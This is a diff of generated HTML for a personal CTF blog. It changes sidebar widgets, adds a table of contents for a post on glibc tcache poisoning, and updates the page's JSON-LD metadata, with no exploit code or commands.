+    <ul class="list entry navigation"><li><a class="widget-last" href="/2025/02/18/tcache_poison/"><div class="item"><time>2025-02-19</time><span>CTF</span></div><span>堆利用之tcache_poison</span></a></li><li><a class="widget-last" href="/2025/01/21/GLIBC%E5%A0%86%E7%AE%A1%E7%90%86-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"><div class="item"><time>2025-02-18</time><span>CTF</span></div><span>GLIBC堆管理_前置知识</span></a></li><li><a class="widget-last" href="/2024/08/22/%E5%87%BA%E9%A2%98%E6%B5%81%E7%A8%8B/"><div class="item"><time>2024-08-22</time><span>CTF</span></div><span>GZ:CTF pwn 出题流程</span></a></li><li><a class="widget-last" href="/2024/08/07/%E5%A0%86%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B/"><div class="item"><time>2024-08-22</time><span>CTF</span></div><span>malloc_2.23流程</span></a></li><li><a class="widget-last" href="/2024/07/08/hello-world/"><div class="item"><time>2024-08-07</time></div><span>Hello World</span></a></li></ul>
   </div>
 </section>
 
     
   
 
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/CTF/" href="/categories/CTF/"
-            active-action="action-categoriesCTF"
-            ><div class='name'>CTF</div><div class='badge'>(5)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/CTF/" style="font-size: 14px; color: #999">CTF</a>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache"><span class="toc-text">Tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="toc-text">基本工作方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-poison%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">Tcache_poison的原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -2699,6 +2695,7 @@ Qu...
   
   <!-- Custom Files side end -->
 </aside>
+
 
 
         </div>
@@ -3180,7 +3177,7 @@ Qu...
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Skynion's World","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"NaN"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Skynion's World"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2024/","name":"2024"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2024/7/","name":"7"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Skynion's World","url":"http://example.com/","keywords":null,"description":"NaN","author":{"@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"NaN"},"publisher":{"@type":"Organization","name":"Skynion's World","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","description":"NaN","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Skynion's World","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Skynion's World","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"NaN"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Skynion's World"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/18/tcache_poison/","name":"堆利用之tcache_poison"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Skynion's World","url":"http://example.com/","keywords":null,"description":"NaN","author":{"@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"NaN"},"publisher":{"@type":"Organization","name":"Skynion's World","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"堆利用之tcache_poison","description":"NaN","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/18/tcache_poison/"},"author":{"@type":"Person","name":"Skynion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Skynion's World","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/18/tcache_poison/","wordCount":0,"datePublished":"2025-02-18T11:17:24.000Z","dateModified":"2025-02-19T13:15:42.914Z","articleSection":"CTF","keywords":"CTF","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
